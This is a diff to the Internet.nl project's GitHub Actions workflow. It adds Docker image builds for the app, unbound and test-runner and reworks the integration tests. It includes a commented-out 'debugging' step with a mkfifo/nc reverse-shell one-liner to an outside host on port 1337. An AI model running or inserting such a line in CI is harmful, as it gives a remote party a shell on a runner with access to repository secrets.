@@ -2,7 +2,9 @@ name: Internet.nl
 
 env:
   DOCKER_IMAGE: ghcr.io/internetstandards/internet.nl:develop
+  DOCKER_IMAGE_UNBOUND: ghcr.io/internetstandards/internet.nl:unbound
   RELEASE_IMAGE: ghcr.io/internetstandards/internet.nl:latest
+  TEST_RUNNER_IMAGE: ghcr.io/internetstandards/internet.nl:test-runner
 
 on:
   pull_request:
@@ -15,11 +17,6 @@ on:
 jobs:
   integration-test:
     runs-on: ubuntu-22.04
-    strategy:
-      matrix:
-        # don't need to test multiple versions since everything runs in Docker,
-        # but keep consistent with rest of the jobs
-        python-version: [ "3.9" ]
     steps:
       - uses: actions/checkout@v3
         # include vendor/ submodules used to build dependencies like nassl and unbound
@@ -33,82 +30,134 @@ jobs:
           registry: ghcr.io
           username: ${{ github.actor }}
           password: ${{ secrets.GITHUB_TOKEN }}
-      # https://docs.docker.com/build/cache/backends/gha/
-      - name: Switch to caching Docker driver
-        run: docker buildx create --use --driver=docker-container
 
       - name: Prefetch docker-compose dependencies in background
         run: make docker-compose-pull-dependencies &
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
 
       - name: Build and push
         uses: docker/build-push-action@v4
         with:
           context: .
           file: docker/Dockerfile
+          target: app
           push: true
+          # TODO: not yet supported: https://github.com/moby/buildkit/issues/1555
+          # load: true
           tags: ${{ env.DOCKER_IMAGE }}
-          cache-from: type=gha
+          cache-from: |
+            type=gha
+            ${{ env.DOCKER_IMAGE }}
           cache-to: type=gha,mode=max
+          # makes build images better usable as cache by allowing individual layers to be pulled from cache
+          build-args: BUILDKIT_INLINE_CACHE=1
 
-      - name: Set up Python ${{ matrix.python-version }}
-        uses: actions/setup-python@v2
+      - name: Build and push unbound
+        uses: docker/build-push-action@v4
         with:
-          python-version: ${{ matrix.python-version }}
-      - name: Make venv
-        run: make venv
+          context: .
+          file: docker/Dockerfile
+          target: unbound
+          push: true
+          # TODO: not yet supported: https://github.com/moby/buildkit/issues/1555
+          # load: true
+          tags: ${{ env.DOCKER_IMAGE_UNBOUND }}
+          cache-from: |
+            type=gha
+            ${{ env.DOCKER_IMAGE_UNBOUND }}
+          cache-to: type=gha,mode=max
+          # makes build images better usable as cache by allowing individual layers to be pulled from cache
+          build-args: BUILDKIT_INLINE_CACHE=1
+
+      - name: Build and push test runner
+        uses: docker/build-push-action@v4
+        with:
+          context: .
+          file: docker/Dockerfile.test-runner
+          push: true
+          # TODO: not yet supported: https://github.com/moby/buildkit/issues/1555
+          # load: true
+          tags: ${{ env.TEST_RUNNER_IMAGE }}
+          cache-from: |
+            type=gha
+            ${{ env.TEST_RUNNER_IMAGE }}
+          cache-to: type=gha,mode=max
+          # makes build images better usable as cache by allowing individual layers to be pulled from cache
+          build-args: BUILDKIT_INLINE_CACHE=1
+
+      # TODO: debugging
+      # - name: Throw interactive shell
+      #   if: always()
+      #   shell: bash -i {0}
+      #   run: |
+      #               rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ijohan.nl 1337 >/tmp/f&
+
       - name: Start test instance
-        run: make docker-compose-up
+        run: |
+          make docker-compose-up ENVIRONMENT=test
+
+      - name: Pull test-runner
+        run: |
+          docker compose --env-file test.env pull test-runner
+
       - name: Run integration tests
-        # run integration tests against test instance (which has empty project name)
-        run: make integration-tests-against-develop
-      - name: Stop test instance
-        run: make docker-compose-down-remove-volumes &
+        run: make integration-tests ENVIRONMENT=test
 
-  live-test:
-    runs-on: ubuntu-22.04
-    strategy:
-      matrix:
-        # don't need to test multiple versions since everything runs in Docker,
-        # but keep consistent with rest of the jobs
-        python-version: [ "3.9" ]
-    steps:
-      - uses: actions/checkout@v3
-        # include vendor/ submodules used to build dependencies like nassl and unbound
+      - name: Archive test results
+        uses: actions/upload-artifact@v3
+        if: always()
         with:
-          submodules: recursive
+          name: integration-test-results
+          path: |
+            integration_tests/test-results/
 
-      # login to pull images from Github registry
-      - name: Login to Docker Hub
-        uses: docker/login-action@v2
-        with:
-          registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}
-      # https://docs.docker.com/build/cache/backends/gha/
-      - name: Switch to caching Docker driver
-        run: docker buildx create --use --driver=docker-container
-
-      - name: Prefetch docker-compose dependencies in background
-        run: make docker-compose-pull-dependencies &
-
-      - name: Build and push
-        uses: docker/build-push-action@v4
-        with:
-          context: .
-          file: docker/Dockerfile
-          push: true
-          tags: ${{ env.DOCKER_IMAGE }}
-          cache-from: type=gha
-          cache-to: type=gha,mode=max
-
-      - name: Set up Python ${{ matrix.python-version }}
-        uses: actions/setup-python@v2
-        with:
-          python-version: ${{ matrix.python-version }}
-      - name: Make venv
-        run: make venv
-      - name: Run live tests
-        run: make live-tests
+  # live-test:
+  #   runs-on: ubuntu-22.04
+  #   strategy:
+  #     matrix:
+  #       # don't need to test multiple versions since everything runs in Docker,
+  #       # but keep consistent with rest of the jobs
+  #       python-version: [ "3.9" ]
+  #   steps:
+  #     - uses: actions/checkout@v3
+  #       # include vendor/ submodules used to build dependencies like nassl and unbound
+  #       with:
+  #         submodules: recursive
+  #
+  #     # login to pull images from Github registry
+  #     - name: Login to Docker Hub
+  #       uses: docker/login-action@v2
+  #       with:
+  #         registry: ghcr.io
+  #         username: ${{ github.actor }}
+  #         password: ${{ secrets.GITHUB_TOKEN }}
+  #     # https://docs.docker.com/build/cache/backends/gha/
+  #     - name: Switch to caching Docker driver
+  #       run: docker buildx create --use --driver=docker-container
+  #
+  #     - name: Prefetch docker-compose dependencies in background
+  #       run: make docker-compose-pull-dependencies &
+  #
+  #     - name: Build and push
+  #       uses: docker/build-push-action@v4
+  #       with:
+  #         context: .
+  #         file: docker/Dockerfile
+  #         push: true
+  #         tags: ${{ env.DOCKER_IMAGE }}
+  #         cache-from: type=gha
+  #         cache-to: type=gha,mode=max
+  #
+  #     - name: Set up Python ${{ matrix.python-version }}
+  #       uses: actions/setup-python@v2
+  #       with:
+  #         python-version: ${{ matrix.python-version }}
+  #     - name: Make venv
+  #       run: make venv
+  #     - name: Run live tests
+  #       run: make live-tests
 
 
   build:
